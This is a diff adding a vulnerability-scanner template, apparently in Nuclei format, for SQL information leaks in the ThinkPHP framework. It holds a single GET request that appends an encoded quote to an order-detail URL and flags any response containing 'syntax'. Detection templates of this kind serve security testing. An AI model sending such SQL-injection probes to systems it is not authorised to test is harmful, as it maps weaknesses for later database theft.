@@ -1,0 +1,22 @@
+id: thinkphp_multi_sql_leak_7
+
+info:
+  name: "ThinkPHP 多处 SQL 信息泄露漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+      
+      ThinkPHP framework is affected by multiple SQL-related information exposure issues. Attackers can exploit these vulnerabilities to retrieve sensitive database structure information through specific query patterns, potentially leading to full database schema enumeration. The vulnerabilities arise from improper handling of SQL query parameters in multiple framework components, allowing unauthorized data disclosure without authentication bypasses.
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/home/order/detail/id/1%27 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'syntax'
